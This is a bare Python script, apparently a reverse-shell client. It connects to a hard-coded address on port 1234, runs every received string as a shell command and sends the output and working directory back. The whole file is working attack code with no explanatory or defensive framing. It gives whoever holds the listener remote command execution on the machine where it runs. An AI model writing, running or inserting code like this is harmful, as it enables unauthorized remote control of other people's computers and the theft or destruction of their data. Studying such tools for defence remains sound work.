import socket
import sys
import subprocess
import os
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.137.180"
port = 1234
s.connect((host, port))

while True:
    data = s.recv(1024).decode()
    if data[:2] == "cd":
        res = data[3:]
        _res = re.split(r'[\\/]', res)
        os.chdir((os.getcwd() + "\\" + "\\".join(_res))[:-1])
    if len(data) > 0:
        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        pwd = str(os.getcwd()) + ">>"
        s.send(cmd.stdout.read())
        s.send(pwd.encode())

s.close()